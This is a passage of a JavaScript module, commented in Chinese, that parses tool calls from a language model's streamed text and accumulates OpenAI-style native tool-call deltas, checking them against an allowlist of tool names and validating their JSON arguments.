      // 整段丢掉，两条通道都不给：recoveredReasoning 在回合被接受后会写回客户端
      // （openai-agent-runtime.js:410），放进去照样是裸 XML 泄漏。这一段按构造就是
      // 工具标记而不是回答，丢掉与旧行为一致 —— 旧代码把它当成一次调用消费后扔掉。
      return finish(leftover);
    }

    const built = buildToolCallPayload(object.text);
    const error = built.error || gateToolName(built.payload, allowedToolNames);
    if (error) {
      errors.push(error);
      logToolError(error);
      // 失败片段不喂给代码上下文追踪器，也不算“正文已经开始” —— 与整段路径同一条规则。
      result.recoveredText += span;
      return finish(leftover);
    }

    result.completedCalls.push(createToolCallObject(built.payload, emittedCallCount));
    emittedCallCount += 1;
    return finish(leftover);
  };

  const drain = (chunk, result, flushing) => {
    let buffer = chunk;

    for (;;) {
      if (inToolCall) {
        afterTrigger += buffer;
        buffer = '';
        const leftover = resolveTriggered(result, flushing);
        if (leftover === null) return;
        buffer = leftover;
        continue;
      }

      pendingText += buffer;
      buffer = '';
      if (!pendingText) return;

      const match = pendingText.match(TOOL_CALL_TRIGGER_RE);
      if (match) {
        const before = pendingText.slice(0, match.index);
        releaseProse(result, before);
        const tail = pendingText.slice(match.index + match[0].length);
        pendingText = '';
        if (code.inCode()) {
          warnings.push({ type: 'triggered_unrecovered', reason: 'inside code context', raw: match[0] });
          logTriggerSuppressed(match[0], 'inside code context');
          releaseProse(result, match[0]);
        } else {
          triggerText = match[0];
          afterTrigger = '';
          inToolCall = true;
        }
        buffer = tail;
        continue;
      }

      if (flushing) {
        releaseProse(result, pendingText);
        pendingText = '';
        return;
      }

      const { safe, remainder } = splitSafeText(pendingText);
      releaseProse(result, safe);
      pendingText = remainder;
      return;
    }
  };

  const push = (chunk) => {
    const result = { textDelta: '', recoveredText: '', completedCalls: [] };
    if (typeof chunk !== 'string' || chunk.length === 0) return result;
    drain(chunk, result, false);
    return result;
  };

  const flush = () => {
    const result = { textDelta: '', recoveredText: '', completedCalls: [] };
    drain('', result, true);
    return result;
  };

  return {
    push,
    flush,
    hasPendingCall: () => inToolCall,
    hasEmittedAnyCall: () => emittedCallCount > 0,
    hasParseError: () => errors.length > 0,
    getErrors: () => [...errors],
    // 触发但无负载：单独一条通道，刻意不参与 hasParseError()。
    hasTriggeredWithoutCall: () => warnings.length > 0,
    getWarnings: () => [...warnings]
  };
};

/**
 * 累积 OpenAI 原生 delta.tool_calls。网页上游一旦开始原生返回工具调用，桥接层无需再依赖 XML。
 */
const createNativeToolCallAccumulator = (options = {}) => {
  const allowedToolNames = normalizeAllowedToolNames(options.allowedToolNames);
  const calls = new Map();
  const errors = [];

  const push = (deltas) => {
    if (!Array.isArray(deltas)) return;
    for (const delta of deltas) {
      if (!delta || typeof delta !== 'object') continue;
      const index = Number.isInteger(delta.index) ? delta.index : calls.size;
      const current = calls.get(index) || {
        index,
        id: delta.id || null,
        type: delta.type || 'function',
        function: { name: '', arguments: '' }
      };
      if (delta.id) current.id = delta.id;
      if (delta.type) current.type = delta.type;
      if (typeof delta.function?.name === 'string' && delta.function.name) {
        const incomingName = delta.function.name;
        if (!current.function.name) {
          current.function.name = incomingName;
        } else if (incomingName === current.function.name || current.function.name.endsWith(incomingName)) {
          // 某些兼容上游会在每个 delta 重复完整 name，不能重复拼接。
        } else if (incomingName.startsWith(current.function.name)) {
          current.function.name = incomingName;
        } else {
          current.function.name += incomingName;
        }
      }
      if (typeof delta.function?.arguments === 'string') current.function.arguments += delta.function.arguments;
      calls.set(index, current);
    }
  };

  const finalize = () => {
    const finalized = [];
    for (const [index, call] of [...calls.entries()].sort((a, b) => a[0] - b[0])) {
      if (!call.function.name) {
        errors.push({ type: 'missing_tool_name', index });
        continue;
      }
      if (allowedToolNames && !allowedToolNames.has(call.function.name)) {
        errors.push({ type: 'unknown_tool', name: call.function.name });
        continue;
      }
      try {
        JSON.parse(call.function.arguments || '{}');
      } catch (_) {
        errors.push({ type: 'invalid_arguments', name: call.function.name });
        continue;
      }
      finalized.push({
        index: finalized.length,
        id: call.id || `call_${generateUUID().replace(/-/g, '').slice(0, 24)}`,
        type: 'function',
        function: {
          name: call.function.name,
          arguments: call.function.arguments || '{}'
        }
      });
    }
    return finalized;
  };

  return {
    push,
    finalize,
    hasAny: () => calls.size > 0,
    hasParseError: () => errors.length > 0,
    getErrors: () => [...errors]
  };
};

module.exports = {
  TOOL_CALL_OPEN,
  TOOL_CALL_CLOSE,
  TOOL_RESULT_OPEN,
  TOOL_RESULT_CLOSE,
  TOOL_CALL_PAYLOAD_WINDOW,
  buildToolSystemPrompt,
  foldToolMessages,
  parseToolCallsFromText,
  createToolCallStreamParser,
  createNativeToolCallAccumulator,
  looksLikeUnexecutedToolAction,
  serializeToolArguments
};
